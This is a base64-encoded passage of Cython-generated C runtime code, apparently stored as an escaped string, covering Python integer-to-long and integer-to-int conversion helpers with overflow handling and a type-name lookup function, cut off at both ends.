ICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgLTM6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgLTQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgbG9uZywgUHlMb25nX0FzTG9uZyh4KSlcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YobG9uZykgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNMb25nTG9uZyh4KSlcbiNlbmRpZlxuICAgICAgICB9XG4gICAgfVxuICAgIHtcbiAgICAgICAgbG9uZyB2YWw7XG4gICAgICAgIGludCByZXQgPSAtMTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIFB5X3NzaXplX3QgYnl0ZXNfY29waWVkID0gUHlMb25nX0FzTmF0aXZlQnl0ZXMoXG4gICAgICAgICAgICB4LCAmdmFsLCBzaXplb2YodmFsKSwgUHlfQVNOQVRJVkVCWVRFU19OQVRJVkVfRU5ESUFOIHwgKGlzX3Vuc2lnbmVkID8gUHlfQVNOQVRJVkVCWVRFU19VTlNJR05FRF9CVUZGRVIgfCBQeV9BU05BVElWRUJZVEVTX1JFSkVDVF9ORUdBVElWRSA6IDApKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHtcbiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPiAoUHlfc3NpemVfdCkgc2l6ZW9mKHZhbCkpKSB7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0ID0gMDtcbiAgICAgICAgfVxuI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSlcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBpc19saXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHVuc2lnbmVkIGNoYXIgKmJ5dGVzID0gKHVuc2lnbmVkIGNoYXIgKikmdmFsO1xuICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXMsIHNpemVvZih2YWwpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfbGl0dGxlLCAhaXNfdW5zaWduZWQpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnY7XG4gICAgICAgIFB5T2JqZWN0ICpzdGVwdmFsID0gTlVMTCwgKm1hc2sgPSBOVUxMLCAqc2hpZnQgPSBOVUxMO1xuICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDtcbiAgICAgICAgaW50IGNodW5rX3NpemUgPSAoc2l6ZW9mKGxvbmcpIDwgOCkgPyAzMCA6IDYyO1xuICAgICAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KHgpKSkge1xuICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHYgPSBQeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgICAgIGFzc2VydChQeUxvbmdfQ2hlY2tFeGFjdCh2KSk7XG4gICAgICAgIH1cbiAgICAgICAge1xuICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh2LCBQeV9GYWxzZSwgUHlfTFQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxO1xuICAgICAgICB9XG4gICAgICAgIGlmIChpc191bnNpZ25lZCAmJiB1bmxpa2VseShpc19uZWdhdGl2ZSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9IGVsc2UgaWYgKGlzX25lZ2F0aXZlKSB7XG4gICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFzdGVwdmFsKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgc3RlcHZhbCA9IHY7XG4gICAgICAgIH1cbiAgICAgICAgdiA9IE5VTEw7XG4gICAgICAgIHZhbCA9IChsb25nKSAwO1xuICAgICAgICBtYXNrID0gUHlMb25nX0Zyb21Mb25nKCgxTCA8PCBjaHVua19zaXplKSAtIDEpOyBpZiAodW5saWtlbHkoIW1hc2spKSBnb3RvIGRvbmU7XG4gICAgICAgIHNoaWZ0ID0gUHlMb25nX0Zyb21Mb25nKGNodW5rX3NpemUpOyBpZiAodW5saWtlbHkoIXNoaWZ0KSkgZ290byBkb25lO1xuICAgICAgICBmb3IgKGJpdHMgPSAwOyBiaXRzIDwgKGludCkgc2l6ZW9mKGxvbmcpICogOCAtIGNodW5rX3NpemU7IGJpdHMgKz0gY2h1bmtfc2l6ZSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0O1xuICAgICAgICAgICAgbG9uZyBpZGlnaXQ7XG4gICAgICAgICAgICBkaWdpdCA9IFB5TnVtYmVyX0FuZChzdGVwdmFsLCBtYXNrKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKGRpZ2l0KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWdpdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIHZhbCB8PSAoKGxvbmcpIGlkaWdpdCkgPDwgYml0cztcbiAgICAgICAgICAgIHRtcCA9IFB5TnVtYmVyX1JzaGlmdChzdGVwdmFsLCBzaGlmdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihzdGVwdmFsKTsgc3RlcHZhbCA9IHRtcDtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7XG4gICAgICAgIFB5X0RFQ1JFRihtYXNrKTsgbWFzayA9IE5VTEw7XG4gICAgICAgIHtcbiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgcmVtYWluaW5nX2JpdHMgPSAoKGludCkgc2l6ZW9mKGxvbmcpICogOCkgLSBiaXRzIC0gKGlzX3Vuc2lnbmVkID8gMCA6IDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA+PSAoMUwgPDwgcmVtYWluaW5nX2JpdHMpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzO1xuICAgICAgICB9XG4gICAgICAgIGlmICghaXNfdW5zaWduZWQpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSh2YWwgJiAoKChsb25nKSAxKSA8PCAoc2l6ZW9mKGxvbmcpICogOCAtIDEpKSkpXG4gICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcbiAgICAgICAgICAgIGlmIChpc19uZWdhdGl2ZSlcbiAgICAgICAgICAgICAgICB2YWwgPSB+dmFsO1xuICAgICAgICB9XG4gICAgICAgIHJldCA9IDA7XG4gICAgZG9uZTpcbiAgICAgICAgUHlfWERFQ1JFRihzaGlmdCk7XG4gICAgICAgIFB5X1hERUNSRUYobWFzayk7XG4gICAgICAgIFB5X1hERUNSRUYoc3RlcHZhbCk7XG4jZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KHJldCkpXG4gICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICByZXR1cm4gdmFsO1xuICAgIH1cbnJhaXNlX292ZXJmbG93OlxuICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLFxuICAgICAgICAidmFsdWUgdG9vIGxhcmdlIHRvIGNvbnZlcnQgdG8gbG9uZyIpO1xuICAgIHJldHVybiAobG9uZykgLTE7XG5yYWlzZV9uZWdfb3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsXG4gICAgICAgICJjYW5cJ3QgY29udmVydCBuZWdhdGl2ZSB2YWx1ZSB0byBsb25nIik7XG4gICAgcmV0dXJuIChsb25nKSAtMTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuc3RhdGljIF9fUHl4X1R5cGVOYW1lXG5fX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5VHlwZU9iamVjdCogdHApXG57XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7XG4gICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgbmFtZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7XG4gICAgI2Vsc2VcbiAgICBuYW1lID0gUHlUeXBlX0dldFF1YWxOYW1lKHRwKTtcbiAgICAjZW5kaWZcbiAgICBpZiAodW5saWtlbHkobmFtZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG5hbWUpKSkgZ290byBiYWQ7XG4gICAgbW9kdWxlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cigoUHlPYmplY3QgKil0cCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KG1vZHVsZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG1vZHVsZSkpKSBnb3RvIGJhZDtcbiAgICBpZiAoUHlVbmljb2RlX0NvbXBhcmVXaXRoQVNDSUlTdHJpbmcobW9kdWxlLCAiYnVpbHRpbnMiKSA9PSAwKSB7XG4gICAgICAgIHJlc3VsdCA9IG5hbWU7XG4gICAgICAgIG5hbWUgPSBOVUxMO1xuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCIlVS4lVSIsIG1vZHVsZSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBOVUxMKSkgZ290byBiYWQ7XG4gIGRvbmU6XG4gICAgUHlfWERFQ1JFRihuYW1lKTtcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgYmFkOlxuICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgaWYgKG5hbWUpIHtcbiAgICAgICAgcmVzdWx0ID0gbmFtZTtcbiAgICAgICAgbmFtZSA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzI4KTtcbiAgICB9XG4gICAgZ290byBkb25lO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKngpIHtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaFxuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgbmVnX29uZSA9IChpbnQpIC0xLCBjb25zdF96ZXJvID0gKGludCkgMDtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybztcbiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHtcbiAgICAgICAgaW50IHZhbDtcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IF9fUHl4X1B5TnVtYmVyX0xvbmcoeCk7XG4gICAgICAgIGlmICghdG1wKSByZXR1cm4gKGludCkgLTE7XG4gICAgICAgIHZhbCA9IF9fUHl4X1B5TG9uZ19Bc19pbnQodG1wKTtcbiAgICAgICAgUHlfREVDUkVGKHRtcCk7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxuICAgIGlmIChpc191bnNpZ25lZCkge1xuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzTmVnKHgpKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBfX1B5eF9jb21wYWN0X3VweWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTdcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1NJWkUoeCkgPCAwKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIHtcbiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woeCwgUHlfRmFsc2UsIFB5X0xUKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0ID09IDEpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBsb25nLCBQeUxvbmdfQXNVbnNpZ25lZExvbmcoeCkpXG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZ0xvbmcoeCkpXG4jZW5kaWZcbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4jaWYgQ1lUSE9OX1VTRV9